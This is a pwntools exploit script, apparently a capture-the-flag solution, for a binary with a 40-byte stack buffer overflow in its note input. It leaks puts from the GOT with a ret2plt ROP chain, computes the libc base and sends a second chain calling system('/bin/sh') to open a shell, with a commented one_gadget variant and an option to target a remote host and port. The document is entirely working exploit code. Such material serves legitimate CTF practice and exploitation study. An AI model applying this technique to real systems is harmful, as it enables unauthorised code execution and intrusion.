#!/usr/bin/env python3

from pwn import *

# pwninit --bin chall --ld ld-linux-x86-64.so.2 --libc libc.so.6
exe = "./chall_patched"
libc = ELF("./libc.so.6")

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''

'''.format(**locals())

elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

offset = 40
pop_rdi = ROP(elf).find_gadget(['pop rdi'])[0]
ret = ROP(elf).find_gadget(['ret'])[0]

# Ret2PLT
payload = flat({offset : [
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.sym['note']
]})

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b'note : ', payload)

GOT_puts = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
info(f"GOT Puts Leaks: {hex(GOT_puts)}")
libc.address = GOT_puts - libc.sym['puts']
info(f"LIBC Base : {hex(libc.address)}")

payload2 = flat({offset : [
    ret, # Stack Alignment
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
]})

io.sendlineafter(b'note : ', payload2)

# or Using onegadget
# '''
# one_gadget libc.so.6
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
# '''
# pop_r12 = ROP(elf).find_gadget(['pop r12'])[0] # pop r12; pop r13; pop r14; pop r15; ret;
# one_gadget = flat({offset: [pop_r12,
#     0x0, # r12 must NULL
#     0xdeadbeef,
#     0xcafebabe,
#     0x0, # r15 must NULL
#     libc.address + 0xe3afe]})
# io.sendlineafter(b'note : ', one_gadget)

io.interactive()